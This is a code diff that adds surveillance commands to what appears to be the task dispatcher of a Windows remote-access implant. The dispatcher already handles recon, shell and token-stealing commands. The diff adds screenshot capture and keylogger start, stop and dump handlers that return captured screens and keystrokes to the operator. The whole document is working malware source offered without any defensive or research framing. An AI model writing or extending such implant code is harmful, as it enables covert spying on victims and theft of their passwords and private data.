@@ -13,6 +13,8 @@
 #include "handlers/recon.h"
 #include "handlers/shell.h"
 #include "handlers/token.h"
+#include "../../include/surveillance/screenshot.h"
+#include "../../include/surveillance/keylogger.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -140,6 +142,14 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_TOKEN_LIST;
   if (str_icmp(cmd, "token_steal") == 0)
     return CMD_TOKEN_STEAL;
+  if (str_icmp(cmd, "screenshot") == 0)
+    return CMD_SCREENSHOT;
+  if (str_icmp(cmd, "keylog_start") == 0)
+    return CMD_KEYLOG_START;
+  if (str_icmp(cmd, "keylog_stop") == 0)
+    return CMD_KEYLOG_STOP;
+  if (str_icmp(cmd, "keylog_dump") == 0)
+    return CMD_KEYLOG_DUMP;
 
   return CMD_NONE;
 }
@@ -324,6 +334,65 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
     result->output = str_dup(
         status == STATUS_SUCCESS ? "Token stolen" : "Failed to steal token");
     result->output_len = result->output ? strlen(result->output) : 0;
+    break;
+
+  case CMD_SCREENSHOT:
+    {
+      BYTE* png_data = NULL;
+      DWORD png_size = 0;
+      if (Screenshot_Capture(&png_data, &png_size)) {
+        result->data = png_data;
+        result->data_len = png_size;
+        result->output = str_dup("Screenshot captured");
+        status = STATUS_SUCCESS;
+      } else {
+         result->output = str_dup("Screenshot failed");
+         status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_KEYLOG_START:
+    if (Keylogger_IsRunning()) {
+      result->output = str_dup("Keylogger already running");
+      status = STATUS_SUCCESS;
+    } else if (Keylogger_Start()) {
+      result->output = str_dup("Keylogger started");
+      status = STATUS_SUCCESS;
+    } else {
+      result->output = str_dup("Failed to start keylogger");
+      status = STATUS_FAILURE;
+    }
+    result->output_len = result->output ? strlen(result->output) : 0;
+    break;
+
+  case CMD_KEYLOG_STOP:
+    Keylogger_Stop();
+    result->output = str_dup("Keylogger stopped");
+    result->output_len = result->output ? strlen(result->output) : 0;
+    status = STATUS_SUCCESS;
+    break;
+
+  case CMD_KEYLOG_DUMP:
+    {
+      char* keylog_data = NULL;
+      DWORD keylog_size = 0;
+      if (Keylogger_GetBuffer(&keylog_data, &keylog_size)) {
+        if (keylog_data && keylog_size > 0) {
+          result->output = keylog_data;  // Transfer ownership
+          result->output_len = keylog_size;
+        } else {
+          result->output = str_dup("No keystrokes captured");
+          result->output_len = result->output ? strlen(result->output) : 0;
+        }
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to get keylog buffer");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
     break;
 
   default:
